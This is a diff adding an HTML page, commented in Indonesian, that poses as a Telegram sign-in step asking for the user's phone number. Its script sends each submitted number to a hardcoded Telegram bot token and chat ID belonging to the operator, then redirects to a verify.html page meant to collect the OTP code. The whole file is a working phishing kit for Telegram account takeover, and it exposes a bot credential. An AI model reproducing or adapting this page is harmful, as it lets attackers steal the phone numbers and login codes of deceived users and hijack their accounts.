@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Masukkan Nomor Telepon</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+      width: 90%;
+      margin: 50px auto;
+      padding: 20px;
+    }
+    .monkey-emoji {
+      font-size: 80px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    select, input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #0077b3;
+    }
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <span class="monkey-emoji">🐵</span>
+    <h1>Enter your telegram number</h1>
+
+<form id="phoneForm">
+  <label for="phone">Telegram phone number</label>
+  <input type="tel" id="phone" placeholder="Your telegram number" required />
+
+  <button type="submit" class="btn">Kirim</button>
+</form>
+
+<div class="status" id="statusMessage"></div>
+
+<script>
+  // === Ganti dengan Bot Token dan Chat ID milik Anda ===
+  const botToken = "7781620873:AAF79kTCxEV2gy6OvQCKZQO97Fwoelqv9So";
+  const chatId   = "6543036611";
+  // ====================================================
+
+  const phoneForm = document.getElementById('phoneForm');
+  const phoneInput = document.getElementById('phone');
+  const statusMessage = document.getElementById('statusMessage');
+
+  phoneForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const phone = phoneInput.value.trim();
+
+    if (!phone) {
+      statusMessage.style.color = "red";
+      statusMessage.textContent = "Nomor telepon tidak boleh kosong!";
+      return;
+    }
+
+    statusMessage.style.color = "black";
+    statusMessage.textContent = "Mengirim...";
+
+    // Format pesan yang akan dikirim ke Bot Telegram
+    const messageText = `@DAWEBPHST 
+_________________________________
+• Nomor Hp : ${phone}
+_________________________________`;
+
+    // URL untuk mengirim pesan ke Bot Telegram
+    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+
+    fetch(telegramAPI)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          statusMessage.style.color = "green";
+          statusMessage.textContent = "sucsess";
+          // Redirect ke halaman kode OTP, kirim phone sebagai parameter
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        } else {
+          statusMessage.style.color = "red";
+          statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
+        }
+      })
+      .catch(error => {
+        statusMessage.style.color = "red";
+        statusMessage.textContent = "Terjadi kesalahan: " + error;
+      });
+  });
+</script>
+</body>
+</html>
